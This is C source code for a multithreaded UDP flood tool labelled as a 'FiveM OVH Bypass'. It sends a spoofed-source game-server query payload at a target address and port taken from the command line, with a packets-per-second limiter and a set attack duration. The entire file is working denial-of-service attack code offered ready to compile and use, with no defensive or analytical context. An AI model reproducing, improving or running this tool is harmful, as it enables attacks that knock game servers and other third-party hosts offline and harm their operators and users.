/*
FiveM OVH Bypass - High Power UDP Flood
Compile: gcc -o fivem_ovh fivem_ovh.c -pthread -O3
*/

#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/udp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netdb.h>
#include <net/if.h>
#include <arpa/inet.h>

#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9
static unsigned long int Q[4096], c = 362436;
static unsigned int floodport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;

void init_rand(unsigned long int x) {
    int i;
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (i = 3; i < 4096; i++) { Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i; }
}

unsigned long int rand_cmwc(void) {
    unsigned long long int t, a = 18782LL;
    static unsigned long int i = 4095;
    unsigned long int x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;
    if (x < c) { x++; c++; }
    return (Q[i] = r - x);
}

unsigned short csum(unsigned short *buf, int count) {
    register unsigned long sum = 0;
    while (count > 1) { sum += *buf++; count -= 2; }
    if (count > 0) { sum += *(unsigned char *)buf; }
    while (sum >> 16) { sum = (sum & 0xffff) + (sum >> 16); }
    return (unsigned short)(~sum);
}

void setup_ip_header(struct iphdr *iph) {
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 100;
    iph->id = htonl(54321);
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
    iph->saddr = inet_addr("192.168.3.100");
}

char payload_data[500] = "\xff\xff\xff\xff\x67\x65\x74\x69\x6e\x66\x6f\x20\x78\x79\x7a";

void *flood(void *par1) {
    char *td = (char *)par1;
    char datagram[MAX_PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
    struct sockaddr_in sin;
    
    sin.sin_family = AF_INET;
    sin.sin_port = htons(floodport);
    sin.sin_addr.s_addr = inet_addr(td);
    
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    if (s < 0) {
        fprintf(stderr, "Could not open raw socket.\n");
        exit(-1);
    }
    
    memset(datagram, 0, MAX_PACKET_SIZE);
    setup_ip_header(iph);
    udph->dest = htons(floodport);
    iph->daddr = sin.sin_addr.s_addr;
    iph->check = csum((unsigned short *)datagram, iph->tot_len);
    
    int tmp = 1;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0) {
        fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
        exit(-1);
    }
    
    init_rand(time(NULL));
    unsigned int i = 0;
    
    while (1) {
        iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
        iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
        udph->source = htons(rand_cmwc() & 0xFFFF);
        
        memcpy((void *)udph + sizeof(struct udphdr), payload_data, 15);
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 15;
        udph->len = htons(sizeof(struct udphdr) + 15);
        iph->check = csum((unsigned short *)datagram, iph->tot_len);
        
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
        pps++;
        if (i >= limiter) { i = 0; usleep(sleeptime); }
        i++;
    }
}

int main(int argc, char *argv[]) {
    if (argc < 6) {
        printf("Usage: %s <target> <port> <threads> <pps> <time>\n", argv[0]);
        exit(-1);
    }
    
    int num_threads = atoi(argv[3]);
    floodport = atoi(argv[2]);
    int maxpps = atoi(argv[4]);
    limiter = 0;
    pps = 0;
    pthread_t thread[num_threads];
    
    for (int i = 0; i < num_threads; i++) {
        pthread_create(&thread[i], NULL, &flood, (void *)argv[1]);
    }
    
    int multiplier = 20;
    for (int i = 0; i < (atoi(argv[5]) * multiplier); i++) {
        usleep((1000 / multiplier) * 1000);
        if ((pps * multiplier) > maxpps) {
            if (1 > limiter) { sleeptime += 100; }
            else { limiter--; }
        } else {
            limiter++;
            if (sleeptime > 25) { sleeptime -= 25; }
            else { sleeptime = 0; }
        }
        pps = 0;
    }
    return 0;
}
